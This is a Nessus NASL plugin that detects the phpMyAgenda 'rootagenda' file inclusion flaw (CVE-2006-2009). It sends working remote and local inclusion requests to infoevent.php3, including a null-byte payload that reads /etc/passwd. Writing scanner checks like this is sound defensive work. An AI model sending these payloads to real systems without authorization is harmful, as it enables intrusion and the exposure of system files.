#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by : 
# http://www.securityfocus.com/archive/1/431862/30/0/threaded
#

if (description) {
 script_id(21305);
 script_version("$Revision: 1.3 $");

 script_cve_id("CVE-2006-2009");
 script_bugtraq_id(17670);
 script_xref(name:"OSVDB", value:"24943");

 name["english"] = "phpMyAgenda rootagenda Parameter File Include Vulnerability";
 script_name(english:name["english"]);
 desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is prone to
remote and local file inclusions attacks.

Description :

phpMyAgenda is installed on the remote system. It's an open source
event management system written in PHP.

The application does not sanitize the 'rootagenda' parameter in some
of it's files. This may allow an attacker to include arbitrary files, possibly 
taken from third-party systems, and parse them with privileges of the account under
which the web server operates.

Successful exploitation of this issue requires that PHP's 'register_globals' 
setting be enabled.

See also :

http://www.securityfocus.com/archive/1/431862/30/0/threaded

Solution :

Disable PHP's 'register_globals' setting.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
 script_description(english:desc["english"]);
 summary["english"] = "Checks for a possible file inclusion flaw in phpMyAgenda";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/phpmyagenda", "/agenda", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 req = http_get(item:string(dir, "/agenda.php3"), port:port);
 #debug_print("request1= ", req, "\n");

 res = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
 #debug_print("res: ", res, "\n");
 
 if(egrep(pattern:"<a href=[^?]+\?modeagenda=calendar", string:res)) {
  file[0] = string("http://", get_host_name(), dir, "/bugreport.txt");
  file[1] = "/etc/passwd";

  req = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[0], "%00"), port:port);
  #debug_print("request1= ", req, "\n");

  recv = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
  #debug_print("receive1= ", recv, "\n");
  if (recv == NULL) exit(0);

  if ("Bug report for phpMyAgenda" >< recv) {
   security_warning(port);
   exit(0);
  }
  else { 
   # Maybe PHP's 'allow_url_fopen' is set to Off on the remote host.
   # In this case, try a local file inclusion.
   req2 = http_get(item:string(dir, "/infoevent.php3?rootagenda=", file[1], "%00"), port:port);
   #debug_print("request2= ", req2, "\n");

   recv2 = http_keepalive_send_recv(data:req2, bodyonly:TRUE, port:port);
   #debug_print("receive2= ", recv2, "\n");
   if (recv2 == NULL) exit(0);
  
   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv2)) {
    # PHP's 'register_globals' and 'magic_quotes_gpc' are enabled on the remote host.
    security_warning(port);
    exit(0);
   }
  }
 }
}
